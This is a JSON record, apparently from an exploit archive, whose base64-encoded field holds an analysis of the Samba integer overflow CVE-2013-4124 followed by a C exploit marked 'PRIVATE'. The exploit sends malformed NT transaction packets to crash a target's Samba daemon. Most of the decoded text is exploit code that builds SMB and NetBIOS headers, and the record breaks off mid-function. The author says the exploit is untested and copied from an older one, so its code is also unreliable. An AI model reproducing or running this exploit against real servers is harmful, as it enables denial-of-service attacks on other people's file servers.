{
    "source": "exploit-database", 
    "exploit": "RXhwbG9pdGF0aW9uOiBzYW1iYSBudHRyYW5zIHJlcGx5IGludGVnZXIgb3ZlcmZsb3cNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19fICAgIF9fXyAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gXyBcICAvIF8gXCAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgX18gIF9ffCAoXykgfHwgfCB8IHwgIF9fXyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIFwvIC8gXF9fLiB8fCB8IHwgfCAvIF9ffCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPiAgPCAgICAvIC8gfCB8X3wgfHwgKF9fIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fL1xfXCAgL18vICAgXF9fXy8gIFxfX198DQoNCg0KQ1ZFLTIwMTMtNDEyNCBzYW1iYSBpbnRlZ2VyIG92ZXJmbG93IGluIG50dHJhbnMgDQpyZXBseSByZWFkaW5nIGVhX2xpc3QNCg0KdnVsbmVyYWJsZSBzYW1iYSBkYWVtb24gaGFzIGEgaW50ZWdlciBvdmVyZmxvdyANCnRvIGNhdXNlIHJlbW90ZSBkb3MgYnkgbnR0cmFucyByZXBseSB3aGlsZSB0aGUgDQpkYWVtb24gcmVhZGluZyBlYV9saXN0LiBJbiB0aGUgZGV0YWlsLCB1bnNpZ25lZA0KZGF0YSB0eXBlIG9mZnNldCB2YXJpYWJsZSBpbiB2dWxuZXJhYmxlIGZ1bmN0aW9uIA0Kb2YgcmVhZF9udHRyYW5zX2VhX2xpc3QgY2FuIGJlIHdyYXAgdXAhIHNlY3VyaXR5DQpidWchIA0KDQoNCng5MGMNCg0KW3Z1bG5lcmFibGUgdmVyc2lvbnNdDQogICAgLSBzYW1iYSAzLjUuMjIgPD0NCiAgICAtIHNhbWJhIDMuNi4xNyA8PQ0KICAgIC0gc2FtYmEgNC4wLjggPD0NCg0KW2NhbGwgZ3JhcGhdDQorcmVwbHlfbnR0cmFucwkvLyByZXBseSBudHRyYW5zDQogICAgKy0+aGFuZGxlX250dHJhbnMNCiAgICAgICAgKy0+IGNhbGxfbnRfdHJhbnNhY3RfY3JlYXRlCS8vIHRyYW5zYWN0IQ0KICAgICAgICAgICAgLT4gcmVhZF9udHRybnNfZWFfbGlzdCh2dWxuZXJhYmxlIGZ1bmN0aW9uKQ0KDQpbc2VjdXJpdHkgYnVnIGFuYWx5emVdDQpzbWJkL250dHJhbnMuYw0KLS0tLSBzbmlwIC0tLS0gc25pcCAtLS0tIHNuaXAgLS0tLSBzbmlwIC0tLS0NCjk3MSAvKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KIDk3MiAgUmVhZCBhIGxpc3Qgb2YgRUEgbmFtZXMgYW5kIGRhdGEgZnJvbSBhbiBpbmNvbWluZyBkYXRhIGJ1ZmZlci4gQ3JlYXRlIGFuIGVhX2xpc3Qgd2l0aCB0aGVtLg0KIDk3MyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqLw0KIDk3NCBFQSBuYW1lcywgZGF0YSBmcm9tIHNhbWJhIGluY29taW5nIGJ1ZmZlciENCiA5NzUgc3RydWN0IGVhX2xpc3QgKnJlYWRfbnR0cmFuc19lYV9saXN0KFRBTExPQ19DVFggKmN0eCwgY29uc3QgY2hhciAqcGRhdGEsIHNpemVfdCBkYXRhX3NpemUpCS8vICpwZGF0YSBpcyBpbmplY3QgdmVjdG9yDQogOTc2IHsNCiA5NzcgICAgICAgICBzdHJ1Y3QgZWFfbGlzdCAqZWFfbGlzdF9oZWFkID0gTlVMTDsNCiA5NzggICAgICAgICBzaXplX3Qgb2Zmc2V0ID0gMDsJLy8gdW5pc2lnbmVkDQogOTc5IA0KIDk4MCAgICAgICAgIGlmIChkYXRhX3NpemUgPCA0KSB7DQogOTgxICAgICAgICAgICAgICAgICByZXR1cm4gTlVMTDsNCiA5ODIgICAgICAgICB9DQogOTgzIA0KIDk4NCAgICAgICAgIHdoaWxlIChvZmZzZXQgKyA0IDw9IGRhdGFfc2l6ZSkgewkvLyBYWFggKDMpIGlmIG9mZnNldCBpcyB3cmFwIHVwIHRoZW4gaXQgZW50ZXJzIHRoZSBsb29wIGNvbnRpbnVseQ0KIDk4NSAgICAgICAgICAgICAgICAgc2l6ZV90IG5leHRfb2Zmc2V0ID0gSVZBTChwZGF0YSxvZmZzZXQpOwkvLyB1bnNpZ25lZCBYWFggKDEpIGlmIG5leHRfb2Zmc2V0IGZyb20gcGRhdGEgcG9pbnRlciBpcyBtdWNoIGxhcmdlIHZhbHVlIHRoZW4gdG8gbGVhZCBpbnRlZ2VyIHdyYXAhDQovLyBYWFggKDQpIG1heSBtZW1vcnkgY29ycnVwdGlvbiBwb2ludCEgaWYgb2Zmc2V0IGlzIHdyYXAgdXAgdGhlbiBzZWNvbmQgYXJndiBwb2ludGVyKHBkYXRhK29mZnNldCs0KSBwb2ludGVycyBhcm91bmQgemVybyBtZW1vcnkgdGhlbiBzbWIgZG9zISANCiA5ODYgICAgICAgICAgICAgICAgIHN0cnVjdCBlYV9saXN0ICplYWwgPSByZWFkX2VhX2xpc3RfZW50cnkoY3R4LCBwZGF0YSArIG9mZnNldCArIDQsIGRhdGFfc2l6ZSAtIG9mZnNldCAtIDQsIE5VTEwpOw0KIDk4NyANCiA5ODggICAgICAgICAgICAgICAgIGlmICghZWFsKSB7DQogOTg5ICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBOVUxMOw0KIDk5MCAgICAgICAgICAgICAgICAgfQ0KIDk5MSANCiA5OTIgICAgICAgICAgICAgICAgIERMSVNUX0FERF9FTkQoZWFfbGlzdF9oZWFkLCBlYWwsIHN0cnVjdCBlYV9saXN0ICopOw0KIDk5MyAgICAgICAgICAgICAgICAgaWYgKG5leHRfb2Zmc2V0ID09IDApIHsNCiA5OTQgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogOTk1ICAgICAgICAgICAgICAgICB9DQogOTk2IA0KIDk5NyAgICAgICAgICAgICAgICAgLyogSW50ZWdlciB3cmFwIHByb3RlY3Rpb24gZm9yIHRoZSBpbmNyZW1lbnQuICovCQkvLyBYWFggcGF0Y2ggY29kZQ0KIDk5OCAgICAgICAgICAgICAgICAgaWYgKG9mZnNldCArIG5leHRfb2Zmc2V0IDwgb2Zmc2V0KSB7DQogOTk5ICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KMTAwMCAgICAgICAgICAgICAgICAgfQ0KMTAwMSANCjEwMDIgICAgICAgICAgICAgICAgIG9mZnNldCArPSBuZXh0X29mZnNldDsJLy8gWFhYICgyKSBpZiBuZXh0X29mZnNldCBpcyBsYXJnZSB2YWx1ZSB0aGVuIG9mZnNldCBpcyB3cmFwIQ0KMTAwMyANCjEwMDQgICAgICAgICAgICAgICAgIC8qIEludGVnZXIgd3JhcCBwcm90ZWN0aW9uIGZvciB3aGlsZSBsb29wLiAqLwkvLyBYWFggcGF0Y2ggY29kZQ0KMTAwNSAgICAgICAgICAgICAgICAgaWYgKG9mZnNldCArIDQgPCBvZmZzZXQpIHsNCjEwMDYgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQoxMDA3ICAgICAgICAgICAgICAgICB9DQoxMDA4IA0KMTAwOSAgICAgICAgIH0NCjEwMTAgDQoxMDExICAgICAgICAgcmV0dXJuIGVhX2xpc3RfaGVhZDsNCjEwMTIgfQ0KLS0tLSBzbmlwIC0tLS0gc25pcCAtLS0tIHNuaXAgLS0tLSBzbmlwIC0tLS0NCg0KLS0tLSBzbmlwIC0tLS0gc25pcCAtLS0tIHNuaXAgLS0tLSBzbmlwIC0tLS0NCjEwMTQgLyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCjEwMTUgIFJlcGx5IHRvIGEgTlRfVFJBTlNBQ1RfQ1JFQVRFIGNhbGwgKG5lZWRzIHRvIHByb2Nlc3MgU0QncykuDQoxMDE2ICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKiovDQoxMDE3IA0KMTAxOCBzdGF0aWMgdm9pZCBjYWxsX250X3RyYW5zYWN0X2NyZWF0ZShjb25uZWN0aW9uX3N0cnVjdCAqY29ubiwNCjEwMTkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RydWN0IHNtYl9yZXF1ZXN0ICpyZXEsDQoxMDIwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVpbnQxNiAqKnBwc2V0dXAsIHVpbnQzMiBzZXR1cF9jb3VudCwNCjEwMjEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hhciAqKnBwcGFyYW1zLCB1aW50MzIgcGFyYW1ldGVyX2NvdW50LA0KMTAyMiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaGFyICoqcHBkYXRhLCB1aW50MzIgZGF0YV9jb3VudCwNCjEwMjMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdWludDMyIG1heF9kYXRhX2NvdW50KQ0KMTAyNCB7DQouLi4NCjExNDggICAgICAgICAgICAgICAgIC8qIFdlIGhhdmUgYWxyZWFkeSBjaGVja2VkIHRoYXQgZWFfbGVuIDw9IGRhdGFfY291bnQgaGVyZS4gKi8NCjExNDkgICAgICAgICAgICAgICAgIGVhX2xpc3QgPSByZWFkX250dHJhbnNfZWFfbGlzdCh0YWxsb2NfdG9zKCksIGRhdGEgKyBzZF9sZW4sDQoxMTUwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWFfbGVuKTsNCi0tLS0gc25pcCAtLS0tIHNuaXAgLS0tLSBzbmlwIC0tLS0gc25pcCAtLS0tDQoNCi0tLS0gc25pcCAtLS0tIHNuaXAgLS0tLSBzbmlwIC0tLS0gc25pcCAtLS0tDQoyNjM5IHN0YXRpYyB2b2lkIGhhbmRsZV9udHRyYW5zKGNvbm5lY3Rpb25fc3RydWN0ICpjb25uLA0KMjY0MCAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJ1Y3QgdHJhbnNfc3RhdGUgKnN0YXRlLA0KMjY0MSAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJ1Y3Qgc21iX3JlcXVlc3QgKnJlcSkNCjI2NDIgew0KLi4uDQoyNjUxICAgICAgICAgLyogTm93IHdlIG11c3QgY2FsbCB0aGUgcmVsZXZhbnQgTlRfVFJBTlMgZnVuY3Rpb24gKi8NCjI2NTIgICAgICAgICBzd2l0Y2goc3RhdGUtPmNhbGwpIHsNCjI2NTMgICAgICAgICAgICAgICAgIGNhc2UgTlRfVFJBTlNBQ1RfQ1JFQVRFOgkvLyBOVF9UUkFOU0FDVF9DUkVBVEUhDQoyNjU0ICAgICAgICAgICAgICAgICB7DQoyNjU1ICAgICAgICAgICAgICAgICAgICAgICAgIFNUQVJUX1BST0ZJTEUoTlRfdHJhbnNhY3RfY3JlYXRlKTsNCjI2NTYgICAgICAgICAgICAgICAgICAgICAgICAgY2FsbF9udF90cmFuc2FjdF9jcmVhdGUoDQoyNjU3ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29ubiwgcmVxLA0KMjY1OCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICZzdGF0ZS0+c2V0dXAsIHN0YXRlLT5zZXR1cF9jb3VudCwNCjI2NTkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAmc3RhdGUtPnBhcmFtLCBzdGF0ZS0+dG90YWxfcGFyYW0sDQoyNjYwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJnN0YXRlLT5kYXRhLCBzdGF0ZS0+dG90YWxfZGF0YSwNCjI2NjEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0ZS0+bWF4X2RhdGFfcmV0dXJuKTsNCjI2NjIgICAgICAgICAgICAgICAgICAgICAgICAgRU5EX1BST0ZJTEUoTlRfdHJhbnNhY3RfY3JlYXRlKTsNCjI2NjMgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQoyNjY0ICAgICAgICAgICAgICAgICB9DQotLS0tIHNuaXAgLS0tLSBzbmlwIC0tLS0gc25pcCAtLS0tIHNuaXAgLS0tLQ0KDQotLS0tIHNuaXAgLS0tLSBzbmlwIC0tLS0gc25pcCAtLS0tIHNuaXAgLS0tLQ0KMjc3MCAvKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KMjc3MSAgUmVwbHkgdG8gYSBTTUJOVHRyYW5zLg0KMjc3MiAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqLw0KMjc3MyANCjI3NzQgdm9pZCByZXBseV9udHRyYW5zKHN0cnVjdCBzbWJfcmVxdWVzdCAqcmVxKQkvLyBzbWJfcmVxdWVzdCENCjI3NzUgew0KLi4uDQoyOTQ1ICAgICAgICAgaWYgKChzdGF0ZS0+cmVjZWl2ZWRfZGF0YSA9PSBzdGF0ZS0+dG90YWxfZGF0YSkgJiYNCjI5NDYgICAgICAgICAgICAgKHN0YXRlLT5yZWNlaXZlZF9wYXJhbSA9PSBzdGF0ZS0+dG90YWxfcGFyYW0pKSB7DQoyOTQ3ICAgICAgICAgICAgICAgICBoYW5kbGVfbnR0cmFucyhjb25uLCBzdGF0ZSwgcmVxKTsNCi0tLS0gc25pcCAtLS0tIHNuaXAgLS0tLSBzbmlwIC0tLS0gc25pcCAtLS0tDQoNCltleHBsb2l0YWJpbGl0eV0NCg0KICAgICoga2V5d29yZHM6DQogICAgLSBzYW1iYSBpbmNvbWluZyBkYXRhDQogICAgLSBFQSBuYW1lcw0KICAgIC0gZGF0YQ0KICAgIC0gMHhmMTAwMDAwMA0KICAgIC0gU01CIE5UVFJBTlMNCiAgICAtIFNhbWJhIHJlcGx5X250dHJhbnMoKSBSZW1vdGUgUm9vdCBFeHBsb2l0DQogICAgICAoaHR0cDovL3d3dy5zZWN1cml0ZWFtLmNvbS9leHBsb2l0cy81VFAwTTJBQUtTLmh0bWwpDQogICAgLSBTTUJfQ09NX05UX1RSQU5TQUNUKDB4YTApID0gTlR0cmFucyAoMzItYml0IGZpZWxkKQ0KICAgIC0gU01CdHJhbnMNCiAgICAtIGh0dHA6Ly91YmlxeC5vcmcvY2lmcy9TTUIuaHRtbA0KDQoNClRoZSBzZWN1cml0eSBidWcgaXMgcmVtb3RlIGRvcyB0byBhIGRhZW1vbiwgdGhlIA0KaW1wYWN0IGlzIGV4aXN0IGV2ZW4gdGhvdWdoIGl0J3MgZXhwbG9pdGVkIG9uIA0KbG9jYWwgbmV0d29yay4gSWYgbGFyZ2UgbG9jYWwgbmV0d29yayBleGlzdCBhbmQgDQptYW55IHNhbWJhIG9uIHRoZSBuZXR3b3JrLCBzZWN1cml0eSByaXNrIGlzIGV4aXN0LiANCkkgYXNzaWduIHRoZSBkb3MgaW1wYWN0IHRvIG1lZGl1bSwgYW5kIHRoZSBhcGFjaGUgDQpvciB3dWZ0cGQgZG9zIHRvIGhpZ2ggYmVjYXVzZSB0aGV5IGFyZSBjYW4gYmUgDQpleHBsb2l0ZWQgb24gaW50ZXJuZXQNCg0KLyoNCg0KICAgICEhISEhIFBSSVZBVEUgISEhISEgUFJJVkFURSAhISEhISBQUklWQVRFICEhISEhIFBSSVZBVEUgISEhISENCg0KICBDVkUtMjAxMy00MTI0IHNhbWJhIHJlbW90ZSBkb3MgcHJpdmF0ZSBleHBsb2l0DQoNCiAgDQogIC4vc2FtYmFfbnR0cmFuc19leHBsb2l0IFt0YXJnZXQgaXAgYWRkcl0NCg0KICAgICogLi4uIHRlc3QgLi4uOg0KICAgICAgSSBkaWRuJ3QgdGVzdCBmb3IgdGhlIGV4cGxvaXQsIEkgDQogICAgICBjb3BpZWQgYW5vdGhlciBzYW1iYSBudHRyYW5zIGV4cGxvaXQgDQogICAgICBpbiAyMDAzIHRoYXQgaHR0cDovL3d3dy5zZWN1cml0ZWFtLmNvDQogICAgICBtL2V4cGxvaXRzLzVUUDBNMkFBS1MuaHRtbC4gSXQgc2hvdWxkIA0KICAgICAgYmUgd29ya3MhDQogICAgICANCiAgICAgIHRoZSBleHBsb2l0IHNlbmQgbWFsZm9ybWVkIG50dHJhbnMgDQogICAgICBzbWIgcGFja2V0IHdpdGggbGFyZ2UgdmFsdWUgb2YgZGF0YSANCiAgICAgIG9mZnNldCB0byBjYXVzZSBpbnRlZ2VyIHdyYXAgaW4gdGhlIA0KICAgICAgdnVsbmVyYWJsZSBmdW5jdGlvbiBvZiByZWFkX250dHJuc19lYV9saXN0DQoNCiAgICAgIEkgbGVmdCBhbiBhcnRpY2xlIHRoYXQgYW5hbHl6ZWQgaXQNCiAgICANCiAgICAhISEhISBQUklWQVRFICEhISEhIFBSSVZBVEUgISEhISEgUFJJVkFURSAhISEhISBQUklWQVRFICEhISEhDQoNCg0KICB4OTBjDQoNCiovDQoNCiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+DQojaW5jbHVkZSA8bmV0aW5ldC9pbi5oPg0KI2luY2x1ZGUgPGFycGEvaW5ldC5oPg0KI2luY2x1ZGUgPG5ldGRiLmg+DQojaW5jbHVkZSA8ZXJybm8uaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPGN0eXBlLmg+DQojaW5jbHVkZSA8c2lnbmFsLmg+DQoNCnR5cGVkZWYgdW5zaWduZWQgY2hhciB1aW50ODsNCnR5cGVkZWYgdW5zaWduZWQgc2hvcnQgdWludDE2Ow0KdHlwZWRlZiB1bnNpZ25lZCBsb25nIHVpbnQzMjsNCg0Kc3RydWN0IHZhcmlhYmxlX2RhdGFfaGVhZGVyDQp7IHVpbnQ4IHdvcmRjb3VudCwgYnl0ZWNvdW50WzJdOw0KfTsNCg0Kc3RydWN0IG5idF9zZXNzaW9uX2hlYWRlcg0KeyB1aW50OCB0eXBlLCBmbGFncywgbGVuWzJdOw0KfTsNCg0Kc3RydWN0IHNtYl9iYXNlX2hlYWRlcg0KeyB1aW50OCBwcm90b2NvbFs0XSwgY29tbWFuZCwgZXJyb3JjbGFzcywgcmVzZXJ2ZWQsIGVycm9yY29kZVsyXTsNCiB1aW50OCBmbGFnczsNCiB1aW50OCBmbGFnczJbMl0sIHJlc2VydmVkMlsxMl0sIHRpZFsyXSwgcGlkWzJdLCB1aWRbMl0sIG1pZFsyXTsNCn07DQoNCnN0cnVjdCBuZWdwcm90X3JlcGx5X2hlYWRlcg0KeyB1aW50OCB3b3JkY291bnQ7DQogdWludDggZGlhbGVjdGluZGV4WzJdOw0KIHVpbnQ4IHNlY3VyaXR5bW9kZTsNCiB1aW50MTYgbWF4bXB4Y291bnQsIG1heHZjY291bnQ7DQogdWludDMyIG1heGJ1ZnNpemUsIG1heHJhd3NpemUsIHNlc3Npb25pZCwgY2FwYWJpbGl0aWVzLCB0aW1lbG93LCB0aW1laGlnaDsNCiB1aW50MTYgdGltZXpvbmU7DQogdWludDgga2V5bGVuOw0KIHVpbnQxNiBieXRlY291bnQ7DQp9Ow0KDQpzdHJ1Y3Qgc2Vzc3NldHVweF9yZXF1ZXN0X2hlYWRlcg0KeyB1aW50OCB3b3JkY291bnQsIGNvbW1hbmQsIHJlc2VydmVkOw0KIHVpbnQ4IG9mZnNldFsyXSwgbWF4YnVmc2l6ZVsyXSwgbWF4bXB4Y291bnRbMl0sIHZjbnVtYmVyWzJdOw0KIHVpbnQ4IHNlc3Npb25pZFs0XTsNCiB1aW50OCBpcGFzc3dkbGVuWzJdLCBwYXNzd2RsZW5bMl07DQogdWludDggcmVzZXJ2ZWQyWzRdLCBjYXBhYmlsaXRpZXNbNF07DQp9Ow0KDQpzdHJ1Y3Qgc2Vzc3NldHVweF9yZXBseV9oZWFkZXINCnsgdWludDggd29yZGNvdW50LCB4Y29tbWFuZCwgeHJlc2VydmVkLCB4b2Zmc2V0WzJdLCBhY3Rpb25bMl0sIGJ5dGVjb3VudFsyXTsNCn07DQoNCnN0cnVjdCB0Y29ueF9yZXF1ZXN0X2hlYWRlcg0KeyB1aW50OCB3b3JkY291bnQsIHhjb21tYW5kLCB4cmVzZXJ2ZWQsIHhvZmZzZXRbMl0sIGZsYWdzWzJdLCBwYXNzd2RsZW5bMl0sIGJ5dGVjb3VudFsyXTsNCn07DQoNCnN0cnVjdCB0Y29ueF9yZXBseV9oZWFkZXINCnsgdWludDggd29yZGNvdW50LCB4Y29tbWFuZCwgeHJlc2VydmVkLCB4b2Zmc2V0WzJdLCBzdXBwb3J0Yml0c1syXSwgYnl0ZWNvdW50WzJdOw0KfTsNCg0Kc3RydWN0IG50dHJhbnNfcHJpbWFyeV9yZXF1ZXN0X2hlYWRlcg0KeyANCiAgdWludDggd29yZGNvdW50OyANCiAgdWludDggbWF4c2V0dXBjb3VudDsgDQogIHVpbnQ4IGZsYWdzWzJdOw0KICB1aW50OCB0b3RhbHBhcmFtY291bnRbNF07IA0KICB1aW50OCB0b3RhbGRhdGFjb3VudFs0XTsNCiAgdWludDggbWF4cGFyYW1jb3VudFs0XTsNCiAgdWludDggbWF4ZGF0YWNvdW50WzRdOw0KICAgIHVpbnQ4IHBhcmFtY291bnRbNF07DQogIHVpbnQ4IHBhcmFtb2Zmc2V0WzRdOw0KICB1aW50OCBkYXRhY291bnRbNF07DQogIHVpbnQ4IGRhdGFvZmZzZXRbNF07ICAvLyBYWFhYIDB4ZjAwMDAwMA0KICB1aW50OCBzZXR1cGNvdW50OyANCiAgdWludDggZnVuY3Rpb25bMl07IA0KICB1aW50OCBieXRlY291bnRbMl07DQp9Ow0KDQojZGVmaW5lIFNNQl9ORUdQUk9UIDB4NzINCiNkZWZpbmUgU01CX1NFU1NTRVRVUFggMHg3Mw0KI2RlZmluZSBTTUJfVENPTlggMHg3NQ0KI2RlZmluZSBTTUJfVFJBTlMyIDB4MzINCiNkZWZpbmUgU01CX05UVFJBTlMgMHhBMA0KI2RlZmluZSBTTUJfTlRUUkFOU0NSRUFURSAweDAxDQojZGVmaW5lIFNNQl9UUkFOUzJPUEVOIDB4MDANCiNkZWZpbmUgU01CX1NFU1NJT05SRVEgMHg4MQ0KI2RlZmluZSBTTUJfU0VTU0lPTiAweDAwDQoNCnVpbnQzMiBzZXNzaW9uaWQsIFBBUkFNQkFTRSA9IDB4ODFjMDAwMDsNCmNoYXIgKnRjb254X3NlcnZlcm5hbWU7DQppbnQgdGlkLCBwaWQsIHVpZDsNCg0KI2RlZmluZSBTVEFDS0JPVFRPTSAweGJmZmZmZmZmDQojZGVmaW5lIFNUQUNLQkFTRSAweGJmZmZkMDAwDQojZGVmaW5lIFRPVEFMQ09VTlQgKChpbnQpKFNUQUNLQk9UVE9NIC0gU1RBQ0tCQVNFKSkNCg0KY2hhciAqbmV0Ymlvc19lbmNvZGVfbmFtZShjaGFyICpuYW1lLCBpbnQgdHlwZSkNCnsgY2hhciBwbGFpbm5hbWVbMTZdLCBjLCAqZW5jb2RlZCwgKnB0cjsNCiBpbnQgaSwgbGVuID0gc3RybGVuKG5hbWUpOw0KIGlmICgoZW5jb2RlZCA9IG1hbGxvYygzNCkpID09IE5VTEwpDQogeyBmcHJpbnRmKHN0ZGVyciwgIm1hbGxvYygpIGZhaWxlZFxuIik7DQogZXhpdCgtMSk7DQogfQ0KIHB0ciA9IGVuY29kZWQ7DQogc3RybmNweShwbGFpbm5hbWUsIG5hbWUsIDE1KTsNCiAqcHRyKysgPSAweDIwOw0KIGZvciAoaSA9IDA7IGkgPCAxNjsgaSsrKQ0KIHsgaWYgKGkgPT0gMTUpIGMgPSB0eXBlOw0KIGVsc2UgDQogeyBpZiAoaSA8IGxlbikgYyA9IHRvdXBwZXIocGxhaW5uYW1lW2ldKTsNCiAgZWxzZSBjID0gMHgyMDsNCiB9DQogKnB0cisrID0gKCgoYyA+PiA0KSAmIDB4ZikgKyAweDQxKTsNCiAqcHRyKysgPSAoKGMgJiAweGYpICsgMHg0MSk7DQogfQ0KICpwdHIgPSAnXDAnOw0KIHJldHVybiBlbmNvZGVkOw0KfQ0KDQp2b2lkIGNvbnN0cnVjdF9uYnRfc2Vzc2lvbl9oZWFkZXIoY2hhciAqcHRyLCB1aW50OCB0eXBlLCB1aW50OCBmbGFncywgdWludDMyIGxlbikNCnsgc3RydWN0IG5idF9zZXNzaW9uX2hlYWRlciAqbmJ0X2hkciA9IChzdHJ1Y3QgbmJ0X3Nlc3Npb25faGVhZGVyICopcHRyOw0KIHVpbnQxNiBubGVuOw0KDQovLyBnZWVuIGlkZWUgb2YgZGl0IGRlIGp1aXN0ZSBtYW5pZXIgaXMsIG1hYXIgJ3QgbGlqa3Qgd2VsIHRlIHdlcmtlbiAuLg0KIGlmIChsZW4gPiA2NTUzNSkgbmxlbiA9IDY1NTM1Ow0KIGVsc2UgbmxlbiA9IGh0b25zKGxlbik7DQoNCiBtZW1zZXQoKHZvaWQgKiluYnRfaGRyLCAnXDAnLCBzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpKTsNCiANCiBuYnRfaGRyLT50eXBlID0gdHlwZTsNCiBuYnRfaGRyLT5mbGFncyA9IGZsYWdzOw0KIG1lbWNweSgmbmJ0X2hkci0+bGVuLCAmbmxlbiwgc2l6ZW9mICh1aW50MTYpKTsNCn0NCg0KLy8gY2FsbGVyIHpvcmd0IHZvb3IganVpc3RlIHdhYXJkZSB2YW4gcHRyLg0Kdm9pZCBjb25zdHJ1Y3Rfc21iX2Jhc2VfaGVhZGVyKGNoYXIgKnB0ciwgdWludDggY29tbWFuZCwgdWludDggZmxhZ3MsIHVpbnQxNiBmbGFnczIsIHVpbnQxNiB0aWQsIHVpbnQxNiBwaWQsIA0KIHVpbnQxNiB1aWQsIHVpbnQxNiBtaWQpDQp7IHN0cnVjdCBzbWJfYmFzZV9oZWFkZXIgKmJhc2VfaGRyID0gKHN0cnVjdCBzbWJfYmFzZV9oZWFkZXIgKilwdHI7DQoNCiBtZW1zZXQoYmFzZV9oZHIsICdcMCcsIHNpemVvZiAoc3RydWN0IHNtYl9iYXNlX2hlYWRlcikpOw0KDQogbWVtY3B5KGJhc2VfaGRyLT5wcm90b2NvbCwgIlx4ZmZTTUIiLCA0KTsNCg0KIGJhc2VfaGRyLT5jb21tYW5kID0gY29tbWFuZDsNCiBiYXNlX2hkci0+ZmxhZ3MgPSBmbGFnczsNCg0KIG1lbWNweSgmYmFzZV9oZHItPmZsYWdzMiwgJmZsYWdzMiwgc2l6ZW9mICh1aW50MTYpKTsNCiBtZW1jcHkoJmJhc2VfaGRyLT50aWQsICZ0aWQsIHNpemVvZiAodWludDE2KSk7DQogbWVtY3B5KCZiYXNlX2hkci0+cGlkLCAmcGlkLCBzaXplb2YgKHVpbnQxNikpOw0KIG1lbWNweSgmYmFzZV9oZHItPnVpZCwgJnVpZCwgc2l6ZW9mICh1aW50MTYpKTsNCiBtZW1jcHkoYmFzZV9oZHItPm1pZCwgJm1pZCwgc2l6ZW9mICh1aW50MTYpKTsNCn0NCg0Kdm9pZCBjb25zdHJ1Y3Rfc2Vzc3NldHVweF9oZWFkZXIoY2hhciAqcHRyKQ0KeyBzdHJ1Y3Qgc2Vzc3NldHVweF9yZXF1ZXN0X2hlYWRlciAqc3hfaGRyID0gKHN0cnVjdCBzZXNzc2V0dXB4X3JlcXVlc3RfaGVhZGVyICopcHRyOw0KIHVpbnQxNiBtYXhidWZzaXplID0gMHhmZmZmLCBtYXhtcHhjb3VudCA9IDIsIHZjbnVtYmVyID0gMzEyNTcsIHB3ZGxlbiA9IDA7DQogdWludDMyIGNhcGFiaWxpdGllcyA9IDB4NTA7DQoNCiBtZW1zZXQoc3hfaGRyLCAnXDAnLCBzaXplb2YgKHN0cnVjdCBzZXNzc2V0dXB4X3JlcXVlc3RfaGVhZGVyKSk7DQoNCiBzeF9oZHItPndvcmRjb3VudCA9IDEzOw0KIHN4X2hkci0+Y29tbWFuZCA9IDB4ZmY7DQogbWVtY3B5KCZzeF9oZHItPm1heGJ1ZnNpemUsICZtYXhidWZzaXplLCBzaXplb2YgKHVpbnQxNikpOw0KIG1lbWNweSgmc3hfaGRyLT52Y251bWJlciwgJnZjbnVtYmVyLCBzaXplb2YgKHVpbnQxNikpOw0KIG1lbWNweSgmc3hfaGRyLT5tYXhtcHhjb3VudCwgJm1heG1weGNvdW50LCBzaXplb2YgKHVpbnQxNikpOw0KIG1lbWNweSgmc3hfaGRyLT5zZXNzaW9uaWQsICZzZXNzaW9uaWQsIHNpemVvZiAodWludDMyKSk7DQogbWVtY3B5KCZzeF9oZHItPmlwYXNzd2RsZW4sICZwd2RsZW4sIHNpemVvZiAodWludDE2KSk7DQogbWVtY3B5KCZzeF9oZHItPnBhc3N3ZGxlbiwgJnB3ZGxlbiwgc2l6ZW9mICh1aW50MTYpKTsNCiBtZW1jcHkoJnN4X2hkci0+Y2FwYWJpbGl0aWVzLCAmY2FwYWJpbGl0aWVz